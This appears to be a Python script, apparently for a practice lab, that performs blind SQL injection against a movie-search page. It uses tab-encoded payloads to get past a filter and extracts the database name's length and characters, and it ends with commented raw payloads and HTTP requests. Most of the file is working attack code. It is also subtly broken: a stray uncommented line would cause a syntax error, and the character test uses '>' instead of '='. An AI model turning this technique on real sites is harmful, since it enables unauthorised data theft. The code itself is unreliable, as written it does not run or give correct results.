import requests
import string

cookies = {"PHPSESSID":"q4qvd15jqqbdi85fn80s7favq2", "security_level":"0"}
url = "http://192.168.0.14/sqli_filtered_code.php?title="
word_list = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
database = ""

# find database length
# payload: ' or (case when (length((select database()))>5) then 1 else 0 end)#
for database_length in range(0,20):
    payload = f"{url}%27%09or%09%28case%09when%09%28length%28%28select%09database%28%29%29%29%3E{database_length}%29%09then%091%09else%090%09end%29%23&action=search"
    response = requests.get(payload, cookies=cookies)
    #print(response.text.find("Incorrect syntax detected!"))
    if (response.text.find("The movie does not exist in our database!") > -1 ):
            print("database length:",database_length)
            break


# find database name
                 (substring((select BINARY database()),{j},1)='{word}')
# ' or (case when ((substring((select BINARY database()),0,1)='a')) then 1 else 0 end)#
for j in range(1,database_length+1):
    for word in word_list:
        payload = f"{url}%27%09or%09%28case%09when%09%28substring%28%28select%09BINARY%09database%28%29%29%2C{j}%2C1%29%3E%27{word}%27%29%09then%091%09else%090%09end%29%23&action=search"
        #print("URL: ",url)
        response = requests.get(payload, cookies=cookies)
        print("find",j,"th value: ",word,response.text.find("The movie does not exist in our database!"))
        if (response.text.find("The movie does not exist in our database!") > -1 ):
            #print("find",j,"th value:",word)
            database = database + word
            break
print("database name:",database)


#' or (case when (length((select database()))>5) then 1 else 0 end)#



#'%09or%09(case%09when%09(length((select%09database()))>5)%09then%091%09else%090%09end)#
#if((length((select database()))={database_length}),(select 1 Union select 2),0)#
#length((select database()))=5
#GET /sqli_filtered_code.php?title= HTTP/1.1


#GET /sqli_filtered_code.php?title=%27%09or%09%28case%09when%28substring%28%28select%09BINARY%09database%28%29%29%2C0%2C1%29%3E%27a%27%29%09then%091%09else%090%09end%29%23&action=search HTTP/1.1
